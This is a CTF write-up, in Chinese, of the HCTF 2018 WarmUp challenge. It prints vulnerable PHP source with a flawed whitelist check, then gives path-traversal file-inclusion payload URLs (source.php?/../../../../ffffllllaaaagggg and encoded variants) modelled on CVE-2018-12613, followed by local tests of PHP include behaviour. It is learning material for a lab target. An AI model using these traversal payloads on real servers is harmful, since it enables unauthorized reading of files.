# [HCTF 2018]WarmUp

查看源码，发现注释 `<!--source.php-->`，访问/source.php。  

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

看到可以传一个 `file` 参数，先判断  

```php
if (! empty($_REQUEST['file'])
    && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])
)
```

需要 `file` 变量不为空，是一个字符串，并且要 `checkFile()` 返回 `true`，再看 `checkFile()` 函数，第一个 if 要求变量被声明且值不为 `null`，容易满足，第二个 if 看变量是否在白名单内，第三个 if 将 file 内容截取开头到第一个 "?" 出现的位置，再查看截取内容是否满足白名单，第四个 if 先将 file 内容执行 `urldecode()`，再截取开头至 "?"，查看是否满足白名单。  
一开始的想法是利用 `checkFile()` 的第三个 if，即 使得 payload 内容中的问号前内容满足白名单，后面跟路径（后面跟路径能被包含的原因后面解释），得到了最初的可能 payload:

```url
1. http://0b72ae59-34b2-43e2-8ece-acf9b5788b9f.node4.buuoj.cn:81/source.php?file=source.php?/../../../../ffffllllaaaagggg
```

经过查阅，漏洞基于 CVE-2018-12613，可以参考 <https://blog.csdn.net/m0_46898243/article/details/106244110>，原因是 include 一个路径时，是因为第一个斜杠前的内容被视作当前路径下的子目录，而后面再跟 `/../` 表示返回上一级的目录，因此，如 `xxx/../` 便被视作当前路径，尽管当前路径下并不存在 `xxx` 目录，所以执行 `include source.php?/../../../../ffffllllaaaagggg` 就等价于 `include /../../../ffffllllaaaagggg`。  
后来看文章的时候发现说 include 里的地址不能有特殊符号，比如这里的问号，但是我上面的 payload 确实是可以执行的，可能是 php 版本的原因(?)。  
我又尝试了其他的 payload:

```url
1. http://0b72ae59-34b2-43e2-8ece-acf9b5788b9f.node4.buuoj.cn:81/source.php?file=source.php%3f/../../../../ffffllllaaaagggg
2. http://0b72ae59-34b2-43e2-8ece-acf9b5788b9f.node4.buuoj.cn:81/source.php?file=source.php%253f/../../../../ffffllllaaaagggg

```

发现都是可以运行得到 flag 的，稍微有点迷惑，能通过 if 校验应该是没问题，第一个实际等价于第二个 payload，浏览器在传输 "?" 时，会自动进行 URL 编码，所以第一第二个 payload 都是满足第三个 if 判断，第三个 payload 在传输到服务器进行一次 URL 解码，在第四个 if 前进行一次 URL 解码，所以还是可以得到 "?"，满足第四个 if，if 都是能过的，剩下问题就是为什么 `include source.php(?/%3f/%253f)/../../../../ffffllllaaaagggg` 都能够顺利执行，然后我开始了测试。  

## 测试

phpstudy: Apache2.4.39, MySQL5.7.26, php5.3.29  

test.php

```php
<?php
include "xxx%253/../hi.php";
echo "xxx%253/../hi.php<br/>";
echo "hello!<br/>";
?>
```

hi.php

```php
<?php
echo "hi<br/>";
?>
```

注意在测试目录中并没有 xxx%253 这个文件夹  
访问 <http://localhost/test.php>  
可以正常输出，说明上面所说 "`include source.php?/../../../../ffffllllaaaagggg` 就等价于 `include /../../../ffffllllaaaagggg`" 是正确的。  

```txt
hi
xxx%253/../hi.php
hello!
```

修改 test.php 为  

```php
<?php
include "xxx?/../hi.php";
echo "xxx%253/../hi.php<br/>";
echo "hello!<br/>";
?>
```

即在路径中加入问号。  
访问出现  

```txt
Warning: include(xxx?/../hi.php) [function.include]: failed to open stream: No such file or directory in D:\Operator\phpstudy\phpstudy_pro\WWW\127.0.0.1\test.php on line 2

Warning: include() [function.include]: Failed opening 'xxx?/../hi.php' for inclusion (include_path='.;C:\php\pear') in D:\Operator\phpstudy\phpstudy_pro\WWW\127.0.0.1\test.php on line 2
xxx%?/../hi.php
hello!
```

说明 include 路径中确实不能出现如 "?" 的特殊符号，至于写的题中的第一个 payload 能够执行，我暂时无从得知，但规范的 payload 的应该是第三个。
